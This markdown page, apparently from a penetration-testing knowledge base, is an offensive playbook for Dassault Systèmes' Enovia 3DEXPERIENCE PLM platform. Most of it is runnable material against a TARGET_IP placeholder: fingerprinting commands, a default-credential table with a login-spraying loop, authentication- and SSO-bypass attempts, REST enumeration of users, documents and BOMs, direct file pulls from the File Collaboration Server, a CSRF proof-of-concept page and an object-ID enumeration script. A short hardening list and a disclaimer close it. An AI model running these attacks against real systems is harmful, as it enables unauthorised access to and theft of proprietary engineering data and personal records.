---
title: "Enovia 3DEXPERIENCE Platform"
date: 2026-02-24
draft: false
---

## Overview

Enovia is Dassault Systèmes' Product Lifecycle Management (PLM) application running on the 3DEXPERIENCE platform. It is deployed in aerospace, defense, automotive, pharmaceutical, and manufacturing industries. The platform manages CAD models, BOMs (Bills of Materials), engineering workflows, regulatory compliance documentation, and sensitive intellectual property. From a security perspective, 3DEXPERIENCE has a large REST API attack surface, complex access control, and numerous default configurations that can lead to unauthorized data access.

---

## Platform Architecture

| Component | Description |
|-----------|-------------|
| 3DEXPERIENCE Server | Java-based application server (Tomcat/WebLogic-backed) |
| FCS (File Collaboration Server) | Stores attachments, CAD files, documents |
| VPLMi | Core PLM engine |
| REST Foundation Services | JSON/XML REST API layer |
| Passport | Single Sign-On authentication service |
| 3DDashboard | Web UI framework |
| EMX | Engineering Matrix Exchange |

---

## Default Ports and Endpoints

| Port | Service |
|------|---------|
| 443 | HTTPS main application |
| 80 | HTTP (redirects to 443) |
| 7777 | Common alternative HTTP port |
| 8443 | Alternative HTTPS |
| 10080 | FCS (File Collaboration Server) |
| 10443 | FCS HTTPS |

### Common URL Patterns

```
https://TARGET_IP/
https://TARGET_IP/3dspace/
https://TARGET_IP/3dsearch/
https://TARGET_IP/3dpassport/
https://TARGET_IP/3ddashboard/
https://TARGET_IP/enovia/
https://TARGET_IP/common/emxNavigator.jsp
https://TARGET_IP/common/emxLogin.jsp
https://TARGET_IP:10080/fcs/
```

---

## Recon Methodology

### Initial Fingerprinting

```bash
nmap -sV -p 80,443,7777,8443,10080,10443 TARGET_IP

# Check for 3DEXPERIENCE-specific headers/responses
curl -sv https://TARGET_IP/ -k 2>&1 | grep -iE "dassault|3dexperience|enovia|3dpassport|vplm"

# Check redirect patterns
curl -skL -o /dev/null -w "Final URL: %{url_effective}\nHTTP: %{http_code}\n" https://TARGET_IP/

# Technology detection
curl -sk https://TARGET_IP/ | grep -iE "DS_3DX|DSApplications|DS\.Platform|mxResources|emx"
```

### Endpoint Discovery

```bash
# Common paths to probe
PATHS=(
  "/3dspace/"
  "/3dpassport/"
  "/3dsearch/"
  "/3ddashboard/"
  "/enovia/"
  "/common/emxLogin.jsp"
  "/common/emxNavigator.jsp"
  "/common/emxHelp.jsp"
  "/common/emxSystem.jsp"
  "/common/schema/"
  "/api/"
  "/api/v2/"
  "/rest/"
  "/resources/"
  "/servlet/"
  "/services/"
  "/fcs/"
  "/FCS/"
  "/swym/"
  "/3dcom/"
)

for path in "${PATHS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET_IP$path")
  echo "$CODE : $path"
done
```

---

## Authentication and Session Management

### Default Credentials

The following credentials are common in demo, trial, and newly deployed instances. **Only test on systems you are authorized to access.**

| Username | Password | Notes |
|----------|----------|-------|
| `admin` | `admin` | Most common default |
| `creator` | `creator` | Default creator account |
| `vplm` | `vplm` | VPLMi engine account |
| `administrator` | `administrator` | Admin variant |
| `Test` | (empty) | Common in demo/trial instances — no password |
| `admin` | `password` | Alternate common default |
| `3dexperience` | `3dexperience` | Platform default |

Also test common LDAP defaults if the platform is integrated with Active Directory: `admin`, `ldapadmin`, `service accounts` with username-as-password patterns.

### Login Endpoint

```bash
# Standard login
curl -sk -X POST "https://TARGET_IP/3dpassport/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=admin&password=admin&tenant=OnPremise"

# Test with empty password (demo/trial instances)
curl -sk -X POST "https://TARGET_IP/3dpassport/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=Test&password=&tenant=OnPremise"

# EMX Login
curl -sk -X POST "https://TARGET_IP/common/emxLogin.jsp" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "txnloginid=admin&txnpasswd=admin&txnsuite=Framework"

# Default credentials to try
for cred in "admin:admin" "creator:creator" "vplm:vplm" "administrator:administrator" "admin:password" "3dexperience:3dexperience" "Test:"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "https://TARGET_IP/3dpassport/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "username=$user&password=$pass")
  echo "$cred -> $CODE"
done
```

### Session Token Extraction

```bash
# Capture session cookies
curl -sk -c /tmp/enovia_cookies.txt \
  -X POST "https://TARGET_IP/3dpassport/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=admin&password=admin"

# Use captured session
curl -sk -b /tmp/enovia_cookies.txt "https://TARGET_IP/3dspace/resources/v1/modeler/dseng/dseng:EngItem"
```

---

## REST API Enumeration

The 3DEXPERIENCE platform exposes a comprehensive REST API.

### Resource Enumeration

```bash
# With valid session, enumerate available resources
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/" | python3 -m json.tool

# Core engineering items
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/dseng/dseng:EngItem?$top=100" | python3 -m json.tool

# Documents
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/documents?$top=100"

# Products
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/dslib/dslib:Member?$top=100"

# Configuration search (retrieve all objects)
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dsearch/resources/v2.0/item?tenant=OnPremise&$top=50"
```

### Sensitive Data in REST API Responses

```bash
# Search for all document types
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/documents?\$top=200&\$select=name,description,modified" | \
  python3 -c "import sys,json; docs=json.load(sys.stdin); [print(d.get('name',''),'-',d.get('description','')) for d in docs.get('member',[])]"

# File content download via FCS
# Get file URL from document metadata
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/documents/DOCUMENT_ID/files" | python3 -m json.tool

# Download file
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP:10080/fcs/FCSServlet?LTicket=TICKET_FROM_ABOVE&action=download" \
  -o downloaded_document.pdf
```

---

## OOTB Exposed Endpoints

Many default 3DEXPERIENCE installations have accessible endpoints that should be protected:

```bash
# EMX system information
curl -sk "https://TARGET_IP/common/emxSystem.jsp" | grep -iE "version|build|java|os"

# Health check endpoints
curl -sk "https://TARGET_IP/3dspace/health"
curl -sk "https://TARGET_IP/3dpassport/health"
curl -sk "https://TARGET_IP/3dsearch/health"

# API discovery (may not require auth)
curl -sk "https://TARGET_IP/3dspace/api"
curl -sk "https://TARGET_IP/api/swagger.json"
curl -sk "https://TARGET_IP/3dspace/resources"

# Admin and system operations
curl -sk "https://TARGET_IP/common/emxAdmin.jsp"
curl -sk "https://TARGET_IP/servlet/SERVLET_NAME"

# Schema exposure
curl -sk "https://TARGET_IP/common/schema/" | grep -iE "xml|schema|attribute"

# OData endpoint
curl -sk "https://TARGET_IP/3dspace/resources/v1/\$metadata"
```

---

## Authentication Bypass Techniques

### Direct Object Reference

```bash
# If object IDs can be guessed or enumerated
# Try accessing objects without authentication
curl -sk "https://TARGET_IP/3dspace/resources/v1/modeler/dseng/dseng:EngItem/OBJECT_ID"

# Test REST API auth bypass
curl -sk "https://TARGET_IP/3dspace/resources/v1/modeler/documents"
# 401 = auth required, 200 = bypass found

# Try with X-Forwarded headers
curl -sk "https://TARGET_IP/3dspace/resources/v1/modeler/documents" \
  -H "X-Forwarded-For: 127.0.0.1"

# Try with null auth header
curl -sk "https://TARGET_IP/3dspace/resources/v1/modeler/documents" \
  -H "Authorization: "
```

### Passport SSO Bypass

```bash
# Check for Passport misconfiguration
curl -sk "https://TARGET_IP/3dpassport/login?service=https://TARGET_IP/3dspace/redirect"

# CAS ticket manipulation
curl -sk "https://TARGET_IP/3dpassport/serviceValidate?ticket=ST-MANIPULATED&service=https://TARGET_IP/3dspace/"

# Try accessing services directly bypassing Passport
curl -sk "https://TARGET_IP/3dspace/resources/v1/modeler/dseng/dseng:EngItem" \
  -H "CSRF-Token: none"
```

---

## Sensitive Data Exposure in REST APIs

### Enumerating Users

```bash
# User enumeration via Passport
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dpassport/resources/v1/people?$top=100" | python3 -m json.tool

# Search for users
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dpassport/resources/v1/people?$search=admin" | python3 -m json.tool

# User profile details
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dpassport/resources/v1/people/USER_ID" | python3 -m json.tool
```

### BOM and Product Structure Extraction

```bash
# Retrieve product structure (intellectual property)
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/dseng/dseng:EngItem/PART_ID/dseng:EngItem.dseng:Composed" | \
  python3 -m json.tool

# Export BOM to CSV format
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dspace/resources/v1/modeler/dslib/dslib:Member?$top=1000&\$format=csv"
```

---

## CSRF in Admin Functions

```bash
# Test for CSRF protection on state-changing operations
# Many 3DEXPERIENCE versions rely on custom CSRF tokens

# Check if CSRF token is validated
curl -sk -b /tmp/enovia_cookies.txt \
  -X POST \
  "https://TARGET_IP/3dspace/resources/v1/modeler/documents" \
  -H "Content-Type: application/json" \
  -d '{"name":"test_csrf","description":"csrf test"}' | python3 -m json.tool

# If the request succeeds without CSRF token → CSRF vulnerability
# Craft CSRF PoC HTML
cat > /tmp/csrf_poc.html << 'EOF'
<html>
<body>
<script>
fetch('https://TARGET_IP/3dspace/resources/v1/modeler/documents', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({name: 'CSRF_TEST', description: 'test'})
}).then(r => r.json()).then(console.log);
</script>
</body>
</html>
EOF
```

---

## Known Misconfigurations

### 1. LDAP Configuration Exposure

```bash
# Some configurations expose LDAP settings
curl -sk -b /tmp/enovia_cookies.txt \
  "https://TARGET_IP/3dpassport/resources/v1/admin/config/ldap" | python3 -m json.tool
```

### 2. Database Connection String Exposure

```bash
# Check for database configuration in error messages
curl -sk "https://TARGET_IP/3dspace/resources/v1/modeler/dseng/dseng:EngItem?error=true"

# Check logs endpoint (may not require auth in older versions)
curl -sk "https://TARGET_IP/common/emxLog.jsp"
```

### 3. FCS (File Collaboration Server) Direct Access

```bash
# FCS stores actual files — check if accessible without valid ticket
curl -sk "http://TARGET_IP:10080/fcs/FCSServlet"

# List FCS contents
curl -sk "http://TARGET_IP:10080/fcs/"

# Try ticket-less file access
curl -sk "http://TARGET_IP:10080/fcs/FCSServlet?action=getFiles"
```

### 4. Debug Mode Information Leakage

```bash
# Debug parameters that may expose internals
curl -sk "https://TARGET_IP/common/emxNavigator.jsp?debug=true"
curl -sk "https://TARGET_IP/3dspace/?verbose=true"
curl -sk "https://TARGET_IP/common/emxSystem.jsp?verbose=1"
```

---

## Enumeration of Object IDs

3DEXPERIENCE uses object IDs in various formats. Enumeration is possible if sequential or predictable:

```python
#!/usr/bin/env python3
"""3DEXPERIENCE object ID enumeration."""
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "https://TARGET_IP"
SESSION = requests.Session()
SESSION.verify = False
SESSION.cookies.update({"3dspace_session": "SESSION_COOKIE"})

# Try sequential object IDs
BASE_ID = "VPMReference.A.0000000"  # Common format

for i in range(1, 1000):
    obj_id = f"{BASE_ID}{i:08d}"
    resp = SESSION.get(f"{TARGET}/3dspace/resources/v1/modeler/dseng/dseng:EngItem/{obj_id}", timeout=5)
    if resp.status_code == 200:
        data = resp.json()
        print(f"[+] Found: {obj_id} -> {data.get('name', 'unknown')}")
```

---

## Recon Methodology Summary

```
1. Identify entry points
   ├─ nmap: 80, 443, 7777, 8443, 10080, 10443
   ├─ HTTP fingerprinting (headers, error pages)
   └─ URL path discovery

2. Authentication enumeration
   ├─ Default credentials (admin:admin, creator:creator)
   ├─ 3DPassport login endpoint
   └─ SSO misconfiguration

3. Unauthenticated endpoint mapping
   ├─ REST API base paths
   ├─ Health check endpoints
   └─ Static file / schema exposure

4. Authenticated enumeration
   ├─ REST API resource enumeration
   ├─ User/role enumeration
   ├─ Document/file access
   └─ BOM and product structure retrieval

5. Vulnerability testing
   ├─ IDOR via object ID manipulation
   ├─ CSRF on state-changing operations
   ├─ FCS direct file access
   └─ Debug endpoint information leakage
```

---

## Security Advisories and Known CVEs

> **Official Reference:** For known CVEs and official patches, always check:
> **https://www.3ds.com/trust-center/security/security-advisories**
>
> Dassault Systemes publishes version-specific CVEs and fixes on this page. Always consult it before and during an engagement to identify the exact vulnerabilities applicable to the target version.

---

## Vulnerability Notes

> **XSS:** XSS vulnerabilities are relatively straightforward to find in this platform across multiple input vectors including form fields, URL parameters, and REST API responses that are reflected in the UI. Details are intentionally omitted to avoid misuse.
>
> **OS Injection and Critical Vulnerabilities:** OS injection and other critical vulnerabilities (including potential RCE) are possible on unpatched instances. These are version-specific. Refer to the official Dassault Systemes security advisories at https://www.3ds.com/trust-center/security/security-advisories for version-specific CVE details and affected components.

---

## Hardening Recommendations

- Enable strong authentication for all endpoints (OAuth2/SAML preferred over basic auth)
- Remove or protect all debug and diagnostic endpoints
- Implement IP-based access restrictions for admin functions
- Enforce CSRF tokens on all state-changing REST API operations
- Restrict FCS access to internal networks and require valid LTickets
- Audit role assignments — principle of least privilege for all PLM users
- Disable default accounts or change default passwords immediately post-installation
- Enable TLS 1.2+ for all communication; disable TLS 1.0/1.1
- Perform regular API security testing during upgrade cycles
- Log and alert on bulk API data extraction (high-volume GET requests)


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.